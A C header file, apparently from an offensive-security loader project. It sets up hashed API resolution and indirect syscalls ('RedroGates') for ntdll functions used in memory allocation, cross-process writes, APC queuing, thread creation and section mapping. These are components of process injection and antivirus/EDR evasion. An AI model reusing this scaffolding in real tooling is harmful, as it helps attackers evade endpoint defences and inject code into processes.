#pragma once

#include <windows.h>
#include "structs.h"


PVOID _memcpy(PVOID Destination, PVOID Source, SIZE_T Size)
{
    for (volatile int i = 0; i < Size; i++) {
        ((BYTE*)Destination)[i] = ((BYTE*)Source)[i];
    }
    return Destination;
}

#define CONTAINING_RECORD(address, type, field) \
    ((type *)((PCHAR)(address) - (ULONG_PTR)(&((type *)0)->field)))

#define INITIAL_HASH 39361212121
#define INITIAL_SEED 12

#define PEP_OFFSET_FAKE 0x30

int strCmp(const char* s1, const char* s2)
{
    /*//printf("comparing the strings 1: %s  \n" , s1 );
    //printf("comparing the strings 2: %s  \n" , s2 );*/
    while (*s1 && (*s1 == *s2))
    {
        s1++;
        s2++;
    }
    return *(const unsigned char*)s1 - *(const unsigned char*)s2;
}




extern VOID        RedroGates(IN DWORD dwSSn, IN PVOID pSyscallInstAddress);
extern NTSTATUS    RedroExec();
extern PVOID       GetPeb(size_t offset);





typedef struct SYSCALL {
    PVOID pFuncAddress;
    DWORD dwSSN;
    PVOID pSyscallAddress;
    DWORD dwSyscallHash;

}SYSCALL, * PSYSCALL;

typedef struct NT_CONFIG {
    PVOID  pModule;
    PDWORD pdwArrayOfNames;
    PDWORD pdwArrayOfAddress;
    PWORD  pwArrayOfOrdianls;
    DWORD  dwNumberOfFunctions;

}NTCONFIG, * PNT_CONFIG;

NTCONFIG Global_NT = { 0 };

typedef struct SYS_FUNC {
    SYSCALL NtAllocateVirtualMemory;
    SYSCALL NtCreateThreadEx;
    SYSCALL NtProtectVirtualMemory;
    SYSCALL NtClose;
    SYSCALL NtWaitForSingleObject;
    SYSCALL NtQuerySystemInformation;
    SYSCALL NtOpenProcess;
    SYSCALL NtWriteVirtualMemory;
    SYSCALL NtResumeThread;
    SYSCALL NtCreateSection;
    SYSCALL NtMapViewOfSection;
    SYSCALL NtUnMapViewOfSection;
    SYSCALL NtCreateUserProcess;
    SYSCALL NtQueueApcThread;
    SYSCALL NtTestAlert;
    SYSCALL NtSetInformationThread;
    SYSCALL NtCreateFile;
    SYSCALL NtReadFile;
}SYS_FUNC, * PSYS_FUNC;

SYS_FUNC sys_func = { 0 };

#define NTCREATEFILE    0x27831C2F
#define NTREADFILE      0x920C0B57
#define NtAllocateVirtualMemoryHash         0xC163C0E0
#define NtWriteVirtualMemoryHash    0xC884AFC6
#define NtProtectVirtualMemoryHash  0xA484609C
#define NTQUEUEAPCTHREADHash        0x7FBFFDCC
#define NTSETINFORMATIONTHREADHash  0x046A3065
#define NTTESTALERTHash     0x1CCD7BF3
#define NTRESUMETHREADHash  0xD7254D24
#define NtCloseHash         0x1812FA51
#define NtCreateThreadExHash        0xE2B97DC4
#define NtWaitForSingleObjectHash   0x384D3FD0
#define NtCreateUserProcessHash     0x036C9F2D 
#define RtlCreateProcessParametersExHash    0x6DE5C2CF
#define RtlInitUnicodeStringHash    0xBF72BF9D
#define NtQuerySystemInformationHash        0x92AAE17C

#define NtOpenProcessHash   0x8151CCCC
#define CreateToolhelp32SnapshotHash    0xEC46A0E9
#define Process32FirstHash      0x020D0CE5
#define CreateProcessHASH       0xF71DCD0D


#define ntdllhash      0x55726B21

//#define NTMAPVIEWHash 	0x6647BF5B  
#define NTMAPVIEWHash 	0xD26FAE9E  

#define NTUNMAPVIEWHash 	0xF5615F81 


#define NTCREATESECTIONHash 	0x44E42D84 


#define SET_SYSCALL(SYSCALL)(RedroGates((DWORD)SYSCALL.dwSSN,(PVOID)SYSCALL.pSyscallAddress))

